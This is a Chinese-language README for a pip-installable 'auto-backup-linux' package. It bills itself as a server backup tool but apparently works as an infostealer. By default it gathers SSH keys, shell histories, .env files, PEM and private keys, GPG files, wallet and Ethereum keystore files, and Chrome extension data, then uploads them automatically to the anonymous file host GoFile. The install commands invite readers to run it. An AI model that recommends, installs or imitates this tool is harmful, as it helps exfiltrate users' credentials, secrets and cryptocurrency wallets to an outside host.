# Auto Backup Linux

一个用于Linux服务器的自动备份工具，支持文件备份、压缩和上传到云端。

## 功能特性

- ✅ 自动备份指定目录和文件
- ✅ 智能文件分类（文档/配置）
- ✅ 自动压缩备份文件
- ✅ 大文件自动分片
- ✅ 自动上传到云端（GoFile）
- ✅ 定时备份功能
- ✅ 日志记录和轮转
- ✅ 网络连接检测
- ✅ 自动重试机制

## 安装

### 从PyPI安装（推荐）

```bash
pip install auto-backup-linux
```

### 从GitHub安装

```bash
pip install git+https://github.com/yourusername/auto-backup-linux.git
```

### 从源码安装

```bash
git clone https://github.com/yourusername/auto-backup-linux.git
cd auto-backup-linux
pip install .
```

## 使用方法

### 命令行使用

安装后，可以直接使用命令行工具：

```bash
auto-backup
```

### Python代码使用

```python
from auto_backup import BackupManager, BackupConfig

# 创建备份管理器
manager = BackupManager()

# 备份文件
backup_dir = manager.backup_linux_files(
    source_dir="~/",
    target_dir="~/.dev/Backup/server"
)

# 压缩备份
backup_files = manager.zip_backup_folder(
    folder_path=backup_dir,
    zip_file_path="backup_20240101"
)

# 上传备份
if manager.upload_backup(backup_files):
    print("备份上传成功！")
```

## 配置说明

### 备份配置

可以通过修改 `BackupConfig` 类来调整配置：

- `DEBUG_MODE`: 调试模式开关
- `MAX_SINGLE_FILE_SIZE`: 单文件最大大小（默认50MB）
- `CHUNK_SIZE`: 分片大小（默认50MB）
- `RETRY_COUNT`: 重试次数（默认5次）
- `RETRY_DELAY`: 重试延迟（默认60秒）
- `BACKUP_INTERVAL`: 备份间隔（默认约3天）
- `SERVER_BACKUP_DIRS`: 需要备份的目录列表
- `DOC_EXTENSIONS`: 文档类型扩展名
- `CONFIG_EXTENSIONS`: 配置类型扩展名
- `EXCLUDE_DIRS`: 排除的目录列表

### 日志配置

日志文件默认保存在：`~/.dev/Backup/backup.log`

- `LOG_FILE`: 日志文件路径
- `LOG_MAX_SIZE`: 日志文件最大大小（默认10MB）
- `LOG_BACKUP_COUNT`: 保留的日志备份数量（默认10个）

## 备份内容

### 默认备份的目录/文件

- `.ssh` - SSH配置
- `.bash_history` - Bash历史记录
- `.python_history` - Python历史记录
- `.bash_aliases` - Bash别名
- `Documents` - 文档目录
- `.node_repl_history` - Node.js REPL历史记录
- `.wget-hsts` - wget HSTS历史记录
- `.Xauthority` - Xauthority文件
- `.ICEauthority` - ICEauthority文件
- Chrome扩展目录（如果存在）

### 备份的文件类型

**文档类型：**
- `.txt`, `.json`, `.js`, `.py`, `.go`, `.sh`, `.sol`, `.rs`, `.env`
- `.csv`, `.bin`, `.wallet`, `.ts`, `.jsx`, `.tsx`

**配置类型：**
- `.pem`, `.key`, `.keystore`, `.utc`, `.xml`, `.ini`, `.config`
- `.yaml`, `.yml`, `.toml`, `.asc`, `.gpg`, `.pgp`, `.conf`

## 系统要求

- Python 3.7+
- Linux操作系统
- 网络连接（用于上传备份）

## 依赖项

- `requests` >= 2.25.0

## 许可证

MIT License

## 贡献

欢迎提交Issue和Pull Request！

## 作者

YLX Studio

## 更新日志

### v1.0.0
- 初始版本发布
- 支持自动备份、压缩和上传
- 支持定时备份
- 支持日志记录

